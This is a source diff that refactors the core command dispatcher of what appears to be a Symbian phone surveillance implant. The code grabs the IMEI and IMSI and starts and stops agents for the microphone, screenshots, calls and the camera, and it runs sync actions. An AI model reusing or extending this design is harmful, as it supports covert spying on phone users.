@@ -93,12 +93,10 @@ void CCore::ConstructL()
 	else
 		iDemoVersion = EFalse;
 	
-	//TODO: test
 	CPhone* phone = CPhone::NewLC();
 	phone->GetImeiSync(iGlobalImei);
 	phone->GetImsiSync(iGlobalImsi);
 	CleanupStack::PopAndDestroy();
-	//end test
 	
 	//TODO: activate this in 8.0
 	if(iDemoVersion)
@@ -122,14 +120,6 @@ void CCore::DisposeAgentsAndActionsL()
 	// Deletes the executed Actions and the stopped Agents...
 	while (i < iEndPoints.Count())
 		{
-		/*
-		if (!iEndPoints[i]->CanReceiveCmd() && (iEndPoints[i]->Type() >= EAction) && (iEndPoints[i]->Type() <= EAction_LAST_ID))
-			{
-			delete iEndPoints[i];
-			iEndPoints.Remove(i);
-			continue;
-			}
-			*/
 		if (((iEndPoints[i]->Type() >= EAction) && (iEndPoints[i]->Type() <= EAction_LAST_ID)) && iEndPoints[i]->FinishedJob())
 					{
 					delete iEndPoints[i];
@@ -147,7 +137,8 @@ void CCore::DisposeAgentsAndActionsL()
 		}	
 	}
 
-void CCore::RestartAllAgentsL()  //TODO: check if still used
+/*
+void CCore::RestartAllAgentsL()  
 	{
 	// Stops all the running Agents...
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
@@ -160,12 +151,12 @@ void CCore::RestartAllAgentsL()  //TODO: check if still used
 			}
 		}
 	}
-
+*/
 
 void CCore::CycleAppendingAgentsL()
 	{
 	// Stops the running Agents that creates logs in append
-	// so excluding: AgentMic, AgentScreenshot, AgentCallLocal, AgentCamera
+	// so excluding: AgentMic, AgentScreenshot, AgentCallLocal, AgentCamera...
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
 		{
 		CDataAgent* dataAgent = iConfig->iAgentsList[i];
@@ -202,19 +193,6 @@ void CCore::StopAllAgentsAndEventsL()
 		}
 
 	// Disposes all the Events...
-	/*
-	int i = 0;
-	while (i < iEndPoints.Count())
-		{
-		if ((iEndPoints[i]->Type() >= EEvent) && (iEndPoints[i]->Type() <= EEvent_LAST_ID))
-			{
-			delete iEndPoints[i];
-			iEndPoints.Remove(i);
-			continue;
-			}
-		i++;
-		}
-		*/
 	TInt i = 0;
 	while(i < iEvents.Count())
 		{
@@ -275,7 +253,6 @@ void CCore::LoadConfigAndStartL()
 		CDataEvent* dataEvent = iConfig->iEventsList[i];
 		CAbstractEvent* newEvent = EventFactory::CreateEventL(dataEvent->iId, dataEvent->iParams,
 				dataEvent->iMacroActionIdx);
-		//iEndPoints.Append(newEvent);
 		iEvents.Append(newEvent);
 		}
 	__FLOG(_L("LoadConfigAndStartL() exit"));
@@ -305,7 +282,6 @@ void CCore::LoadNewConfigL()
 		
 	}
 
-//void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 void CCore::StartAgentL(TAgentType aAgentId)
 	{
 	// MARK: Begin AGENT_CALL Patch
@@ -370,7 +346,6 @@ void CCore::StartAgentL(TAgentType aAgentId)
 	}
 
 
-//void CCore::StopAgentL(TInt aQueueId, TAgentType agentId)
 void CCore::StopAgentL(TAgentType aAgentId)
 	{
 	// MARK: Begin AGENT_CALL Patch
@@ -419,40 +394,20 @@ void CCore::DisableEventL(TInt aEventIdx)
 		iEvents[aEventIdx]->StopEventL();
 	}
 
-/*
-void CCore::ExecuteActionL(TInt aQueueId,TActionType type, const TDesC8& params)
+void CCore::ExecuteActionL(TInt aQueueId,CDataAction* aDataAction)
 	{
-	__FLOG_1(_L("ExecuteAction: %d"), type);
-
-	if (type == EAction_Sync || type == EAction_SyncApn)
-		{
-		//RestartAllAgentsL();  // original MB
-		CycleAppendingAgentsL();
-		}
-	
-	// Creates the Action and send it a Start
-	CAbstractAction* newAction = ActionFactory::CreateActionL(type, params, (TQueueType) aQueueId);
-	iEndPoints.Append(newAction);
-	TCmdStruct startCmd(EStart, ECore, type);
-	SubmitNewCommandL(aQueueId,startCmd);
-	__FLOG(_L("ActionsExecuted"));
-	}
-*/
-void CCore::ExecuteActionL(TInt aQueueId,CDataAction* aAction)
-	{
-	TActionType type = aAction->iId;
+	TActionType type = aDataAction->iId;
 	
 	__FLOG_1(_L("ExecuteAction: %d"), type);
 	
 	if (type == EAction_Sync || type == EAction_SyncApn)
 		{
-		//RestartAllAgentsL();  // original MB
 		CycleAppendingAgentsL();
 		}
 	
 	// Creates the Action and send it a Start
-	CAbstractAction* newAction = ActionFactory::CreateActionL(type, aAction->iParams, (TQueueType) aQueueId);
-	newAction->iTag = aAction->iTagId;
+	CAbstractAction* newAction = ActionFactory::CreateActionL(type, aDataAction->iParams, (TQueueType) aQueueId);
+	newAction->iTag = aDataAction->iTagId;
 	if(type == EAction_Event)
 		{
 		CActionEvent* actionEvent = (CActionEvent*)newAction;
@@ -463,9 +418,8 @@ void CCore::ExecuteActionL(TInt aQueueId,CDataAction* aAction)
 		CActionAgent* actionAgent = (CActionAgent*)newAction;
 		actionAgent->SetCorePointer(this);
 		}
-	newAction->iConditioned = aAction->iConditioned;
+	newAction->iConditioned = aDataAction->iConditioned;
 	iEndPoints.Append(newAction);
-	//TCmdStruct startCmd(EStart, ECore, type);
 	TCmdStruct startCmd(EStart, ECore, type, newAction->iTag);
 	SubmitNewCommandL(aQueueId,startCmd);
 	__FLOG(_L("ActionsExecuted"));
@@ -502,34 +456,7 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 		{
 		CDataAction* action = macroAction->iActionsList[i];
 
-		// Handles the special cases Start Agent / Stop Agent because we have to check 
-		// if the Agent is already running and stop it, or create a new Agent and start it.
-		// EAction_StartAgent and EAction_StopAgent are not "real" Actions objects, they just start or stop Agents
-		// Handles also the special cases enable event / disable event
-		switch (action->iId)
-			{
-			/*
-			case EAction_StartAgent:
-				{
-				TAgentType agentId = (TAgentType)action->iAdditionalData;
-				if(agentId>0)
-					StartAgentL(queueId,agentId);
-				}
-				break;
-			case EAction_StopAgent:
-				{
-				TAgentType agentId = (TAgentType) action->iAdditionalData;
-				if(agentId>0)
-					StopAgentL(queueId,agentId);
-				}
-				break;
-				*/
-			default:
-				// All others are real Actions, so creates new Actions instances and send them a START commmand
-				//ExecuteActionL(queueId,action->iId, action->iParams);
-				ExecuteActionL(queueId,action);
-				break;
-			}
+		ExecuteActionL(queueId,action);
 		}
 
 	// This command has been dispatched.
